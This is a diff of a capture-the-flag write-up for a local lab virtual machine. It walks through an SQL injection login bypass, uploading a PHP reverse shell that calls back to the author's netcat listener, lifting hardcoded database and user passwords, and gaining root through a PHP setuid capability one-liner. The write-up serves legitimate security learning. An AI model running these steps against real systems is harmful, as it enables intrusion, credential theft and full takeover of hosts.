@@ -12,7 +12,8 @@ For this box, only an OVA for a virtual machine is provided, where I can see IP 
 1. [Scan](#scan)
 2. [Web Enumeration](#Web-Enumeration)
 3. [Burp Suite](#Burp-Suite)
-4. [Malicious Upload](#Malicious-Upload)
+4. [Reverse shell](#Reverse-shell)
+5. [SSH shell](#SSH-shell)
 
 
 ---
@@ -138,6 +139,8 @@ These payloads indicate the presence of an SQL injection vulnerability elsewhere
 SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. 
 By injecting malicious SQL code into user inputs, an attacker can bypass authentication, extract data, or even modify the database.
 
+---
+
 </details>
 
 
@@ -152,6 +155,8 @@ Here is an introduction from my AI assistant :
 Burp Suite is a powerful web security testing tool used by pentesters and bug bounty hunters. 
 It acts as an intercepting proxy, allowing you to capture, inspect, and modify HTTP requests and responses between your browser and a web application. 
 It also includes tools like Intruder (for automation) and Repeater (for manual testing).
+
+---
 
 </details>
 
@@ -174,6 +179,8 @@ Let's try Burpt Suite, first we need to configure it and test it.
     Click "Login"
 
 And here Burp Suite should send a new entry in the proxy tab, showing results of the request like this :
+
+---
 
 ---
 
@@ -245,11 +252,164 @@ SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';
 ```
 Since '1'='1' is always true, the authentication is bypassed, and access is granted.
 
+---
+
 </details>
 
 I can see in this webpage the second flag too : ```FLAG2{L-ARCHIVAGE-DE-DONNEES-SANS-VERIFICATION-EST-TRES-DANGEREUX}``` which could be in english ```FLAG2{STORING-DATA-WITHOUT-VERIFICATION-IS-VERY-DANGEROUS}```.
 
-## Malicious Upload
+## Reverse shell
 
+I choose to use again the usefull (pentestmonkey php revshell)[https://github.com/pentestmonkey/php-reverse-shell]
+```wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php```
 
+Don't forget to change your ip and port listening
 
+```
+$ip = '192.168.56.56';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+```
+
+I only needed to upload it as it in the upload webpage and it worked.
+
+<img width="1194" height="434" alt="POC4phprevshell" src="https://github.com/user-attachments/assets/d9c4054a-4386-45a0-852b-4d6caa91217e" />
+
+Before processing further we need to listen on the right port (the one indicated in the revshell) with ```nc -lvnp 4444```
+
+Now I just need to go to the location indicated by the website to find my revshell, simply go to the right url : ```http://192.168.56.158/data/php-reverse-shell.php```
+And it will execute the code and here we are, with a revshell logged as ```www-data```
+
+Now let's go for a roaming in the endless possibility of files, I can't access to the homes, and to other important files too because I'm as www-data and so with low privileges.
+Finaly finding an hint in the /var/www/html, saying that some credentials for database is burried around here, and after analyzing some files, I found it in the ```index.php```.
+
+```
+//Initialisation des informations de connexion
+        $server = '127.0.0.1';
+        $user = 'god';
+        $password = 'MySup3rPr0t3ct3dP@$$w0rd!1337';
+        $database = 'secret';
+        $web_user = $_POST['username'];
+        $web_pass = $_POST['password'];
+```
+
+Let's try thoses credentials in phpmyadmin webpage, and here we go I'm logged as god. In the secret/accounts table I find alix credentials and FLAG3:
+
+```
+| id | user  |  password            |  description                                      |
+| ---| ------|----------------------|---------------------------------------------------|
+| 1  | alix  |  M0TD3P@$$TR3SF0RT!  |  FLAG3{TRES-SECURISE-D-AFFICHER-LE-MDP-EN-CLAIR}  |
+```
+
+I use theses credentials to log in as alix in SSH with a stable shell.
+
+## SSH shell
+
+In the Alix home I just find the ```FLAG4{L-ESCALATION-DE-PRIVILEGES-SE-FAIT-PAR-LES-CAPABILITIES}``` saying that escalate can be done thanks to the capabilities.
+
+<details>
+
+<summary>What are Capabilities?</summary>
+
+Linux capabilities break root privileges into smaller units. Instead of needing full root access, a binary can be given only the capability it needs.
+
+Example:
+
+A binary with ```cap_setuid+ep``` can change its user ID to root, even when launched by a normal user.
+
+---
+
+</details>
+
+So let's ask a command to AI assistant for finding a bin with capabilities abuse possibility.
+
+```
+for f in $(find /usr /bin /sbin /lib* /opt -type f 2>/dev/null); do
+>   /sbin/getcap "$f" 2>/dev/null
+> done | grep -v '^$'
+```
+
+And here I find thoses results :
+
+```
+/usr/bin/php7.3 = cap_setuid+ep
+/usr/bin/ping = cap_net_raw+ep
+```
+
+This is highly exploitable. The capability ```cap_setuid+ep``` on ```/usr/bin/php7.3``` means PHP can change its UID, even to root, without sudo.
+So let's investigate in (GTFOBins)[https://gtfobins.github.io/gtfobins/php/#capabilities] :
+
+```
+Capabilities
+If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+cp $(which php) .
+sudo setcap cap_setuid+ep php
+
+CMD="/bin/sh"
+./php -r "posix_setuid(0); system('$CMD');"
+```
+
+The sudo command is not recognized but let's try the second part :
+
+```
+CMD="/bin/sh"
+/usr/bin/php7.3 -r "posix_setuid(0); system('$CMD');"
+```
+
+And here I'm logged as root, and finding the last flag.
+
+```
+whoami
+root
+cat /root/FLAG5.txt
+FLAG5{GGWP-C-ETAIT-PAS-SI-DURE-J-ESPERE-^^}
+
+                                                          .;;,
+                                     .,.               .,;;;;;,
+                                    ;;;;;;;,,        ,;;%%%%%;;
+                                     `;;;%%%%;;,.  ,;;%%;;%%%;;
+                                       `;%%;;%%%;;,;;%%%%%%%;;'
+                                         `;;%%;;%:,;%%%%%;;%%;;,
+                                            `;;%%%,;%%%%%%%%%;;;
+                                               `;:%%%%%%;;%%;;;'
+           ..,,,.                                 .:::::::.
+        .;;;;;;;;;;,.                                  s.
+        `;;;;;;;;;;;;;,                               ,SSSs.
+          `:.:.:.:.:.:.:.                            ,SSSSSSs.
+           .;;;;;;;;;;;;;::,                        ,SSSSSSSSS,
+          ;;;;;;;;;;;;;;;;:::%,                    ,SS%;SSSSSSsS
+         ;;;;;;,:,:::::::;::::%%,                  SS%;SSSSSSsSS
+         ;;;;;,::a@@@@@@a::%%%%%%%,.   ...         SS%;SSSSSSSS'
+         `::::::@@@@@@@@@@@a;%%%%%%%%%'  #;        `SS%;SSSSS'
+  .,sSSSSs;%%,::@@@@@@;;' #`@@a;%%%%%'   ,'          `S%;SS'
+sSSSSSSSSSs;%%%,:@@@@a;;   .@@@a;%%sSSSS'           .%%%;SS,
+`SSSSSSSSSSSs;%%%,:@@@a;;;;@@@;%%sSSSS'        ..,,%%%;SSSSSSs.
+  `SSSSSSSSSSSSs;%%,%%%%%%%%%%%SSSS'     ..,,%;sSSS;%;SSSSSSSSs.
+     `SSSSSSSSSSS%;%;sSSSS;""""   ..,,%sSSSS;;SSSS%%%;SSSSSSSSSS.
+         """""" %%;SSSSSS;;%..,,sSSS;%SSSSS;%;%%%;%%%%;SSSSSS;SSS.
+                `;SSSSS;;%%%%%;SSSS;%%;%;%;sSSS;%%%%%%%;SSSSSS;SSS
+                 ;SSS;;%%%%%%%%;%;%sSSSS%;SSS;%%%%%%%%%;SSSSSS;SSS
+                 `S;;%%%%%%%%%%%%%SSSSS;%%%;%%%%%%%%%%%;SSSSSS;SSS
+                  ;SS;%%%%%%%%%%%%;%;%;%%;%%%%%%%%%%%%;SSSSSS;SSS'
+                  SS;%%%%%%%%%%%%%%%%%%%;%%%%%%%%%%%;SSSSSS;SSS'
+                  SS;%%%%%%%%%%%%%%%%%%;%%%%%%%%%%%;SSSSS;SSS'
+                  SS;%%%%%%%%%%%%%;sSSs;%%%%%%%%;SSSSSS;SSSS
+                  `SS;%%%%%%%%%%%%%%;SS;%%%%%%;SSSSSS;SSSS'
+                   `S;%%%%%%%%%%%%%%%;S;%%%%%;SSSS;SSSSS%
+                    `S;%;%%%%%%%%%%%'   `%%%%;SSS;SSSSSS%.
+                  ,S;%%%%%%%%%%;'      `%%%%%;S   `SSSSs%,.
+                  ,%%%%%%%%%%;%;'         `%;%%%;     `SSSs;%%,.
+               ,%%%%%%;;;%;;%;'           .%%;%%%       `SSSSs;%%.
+            ,%%%%%' .%;%;%;'             ,%%;%%%'         `SSSS;%%
+          ,%%%%'   .%%%%'              ,%%%%%'             `SSs%%'
+        ,%%%%'    .%%%'              ,%%%%'                ,%%%'
+      ,%%%%'     .%%%              ,%%%%'                 ,%%%'
+    ,%%%%'      .%%%'            ,%%%%'                  ,%%%'
+  ,%%%%'        %%%%           ,%%%'                    ,%%%%
+  %%%%'       .:::::         ,%%%'                      %%%%'
+.:::::        :::::'       ,%%%'                       ,%%%%
+:::::'                   ,%%%%'                        %%%%%
+                        %%%%%'                         %%%%%
+                      .::::::                        .::::::
+                      ::::::'                        ::::::::
+```
